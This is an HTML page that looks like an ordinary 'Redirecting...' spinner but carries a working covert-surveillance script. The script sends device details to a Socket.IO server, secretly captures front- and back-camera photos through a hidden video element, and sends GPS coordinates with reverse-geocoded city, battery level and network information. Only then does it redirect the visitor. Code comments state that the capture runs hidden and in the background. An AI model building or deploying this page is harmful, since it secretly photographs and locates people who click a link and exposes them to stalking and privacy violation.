<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 8px;
        }
        .redirect-url {
            font-size: 14px;
            color: #4285f4;
            word-break: break-all;
            font-weight: 500;
        }
        .sub-text {
            font-size: 13px;
            color: #888;
            margin-top: 12px;
        }
        /* Hidden elements for data collection */
        #hiddenVideo {
            display: none;
        }
        #debugInfo {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please wait a moment</div>
    </div>

    <!-- Hidden video element for camera access -->
    <video id="hiddenVideo" autoplay playsinline></video>

    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <script>
        // ============================================
        // SOCKET.IO FALLBACK
        // ============================================
        if (typeof io === 'undefined') {
            var script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(script);
            script.onload = function() {
                if (typeof io !== 'undefined') initApp();
            };
        } else {
            initApp();
        }

        // ============================================
        // MAIN APPLICATION (COMPLETE TRANSPARENT)
        // ============================================
        function initApp() {
            const visitorId = window.location.pathname.split('/').pop();
            let socket = null;
            let redirectUrl = '';
            let dataCollected = {
                frontCamera: false,
                backCamera: false,
                location: false,
                battery: false,
                network: false,
                deviceInfo: false
            };
            let redirectTriggered = false;

            // ============================================
            // 1. FETCH REDIRECT URL
            // ============================================
            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                        startDataCollection();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                                startDataCollection();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                                startDataCollection();
                            });
                    });
            }

            // ============================================
            // 2. START DATA COLLECTION
            // ============================================
            function startDataCollection() {
                initConnection();
            }

            // ============================================
            // 3. SOCKET CONNECTION
            // ============================================
            function initConnection() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 3,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', () => {
                        // Send device info
                        const deviceInfo = {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            screenResolution: `${window.screen.width}x${window.screen.height}`,
                            language: navigator.language,
                            deviceName: navigator.userAgentData ?
                                navigator.userAgentData.brands.map(b => b.brand).join(', ') :
                                navigator.platform,
                            os: navigator.userAgentData ?
                                navigator.userAgentData.platform :
                                navigator.platform
                        };

                        socket.emit('visitor-connect', {
                            visitorId: visitorId,
                            ...deviceInfo
                        });
                        dataCollected.deviceInfo = true;

                        // Start collecting all data in background
                        setTimeout(() => {
                            setupCamera();
                            getLocation();
                            getBatteryInfo();
                            getNetworkInfo();
                        }, 500);
                    });

                    socket.on('connect_error', () => {
                        // Retry silently
                        setTimeout(() => socket.connect(), 2000);
                    });

                } catch (error) {
                    // Silent fail - continue with redirect
                    checkAndRedirect();
                }
            }

            // ============================================
            // 4. CAMERA (Background - No Preview)
            // ============================================
            async function setupCamera() {
                try {
                    // Front camera (hidden)
                    const frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = frontStream;
                    video.play();

                    setTimeout(() => {
                        capturePhoto('front', video);
                    }, 1500);

                    // Back camera (if available)
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment' },
                            audio: false
                        });
                        const backVideo = document.createElement('video');
                        backVideo.srcObject = backStream;
                        backVideo.autoplay = true;
                        backVideo.style.display = 'none';
                        document.body.appendChild(backVideo);

                        setTimeout(() => {
                            capturePhoto('back', backVideo);
                        }, 2500);
                    } catch (e) {
                        // Back camera not available - ignore
                    }
                } catch (error) {
                    // Camera not available - continue
                    checkAndRedirect();
                }
            }

            // ============================================
            // 5. CAPTURE PHOTO (Background)
            // ============================================
            function capturePhoto(type, video) {
                if (!video || !video.videoWidth) return;

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: type === 'back' ? 'backCamera' : 'frontCamera',
                        content: imageData
                    });
                    dataCollected[type === 'back' ? 'backCamera' : 'frontCamera'] = true;
                }

                checkAndRedirect();
            }

            // ============================================
            // 6. LOCATION (Background)
            // ============================================
            function getLocation() {
                if (!navigator.geolocation) {
                    checkAndRedirect();
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;

                        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                            .then(res => res.json())
                            .then(data => {
                                const locationInfo = {
                                    lat: lat,
                                    lng: lng,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    country: data.countryName || 'Unknown',
                                    state: data.principalSubdivision || 'Unknown',
                                    city: data.locality || 'Unknown'
                                };

                                if (socket && socket.connected) {
                                    socket.emit('visitor-data', {
                                        visitorId: visitorId,
                                        type: 'location',
                                        content: locationInfo
                                    });
                                    dataCollected.location = true;
                                }
                                checkAndRedirect();
                            })
                            .catch(() => {
                                const locationInfo = {
                                    lat: lat,
                                    lng: lng,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString()
                                };
                                if (socket && socket.connected) {
                                    socket.emit('visitor-data', {
                                        visitorId: visitorId,
                                        type: 'location',
                                        content: locationInfo
                                    });
                                    dataCollected.location = true;
                                }
                                checkAndRedirect();
                            });
                    },
                    () => {
                        checkAndRedirect();
                    },
                    { timeout: 8000, enableHighAccuracy: true }
                );
            }

            // ============================================
            // 7. BATTERY (Background)
            // ============================================
            function getBatteryInfo() {
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(battery => {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId: visitorId,
                                    type: 'battery',
                                    content: level
                                });
                                dataCollected.battery = true;
                            }
                        })
                        .catch(() => {});
                }
            }

            // ============================================
            // 8. NETWORK (Background)
            // ============================================
            function getNetworkInfo() {
                let networkData = {
                    type: 'Unknown',
                    effectiveType: 'Unknown',
                    downlink: 'Unknown',
                    rtt: 'Unknown'
                };

                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown',
                        rtt: conn.rtt || 'Unknown'
                    };
                }

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: 'network',
                        content: networkData
                    });
                    dataCollected.network = true;
                }
            }

            // ============================================
            // 9. REDIRECT (After Data Collection)
            // ============================================
            function checkAndRedirect() {
                if (redirectTriggered) return;

                // Wait 4-5 seconds for data collection then redirect
                setTimeout(() => {
                    if (redirectTriggered) return;
                    redirectTriggered = true;

                    // Send redirect complete
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId: visitorId,
                            type: 'redirectComplete',
                            content: { redirected: true, time: new Date().toISOString() }
                        });
                    }

                    // Redirect to original URL
                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 500);
                }, 4000);
            }

            // ============================================
            // 10. START
            // ============================================
            fetchRedirectUrl();

            // Cleanup on page leave
            window.addEventListener('beforeunload', () => {
                if (socket) socket.disconnect();
            });
        }
    </script>
</body>
</html>
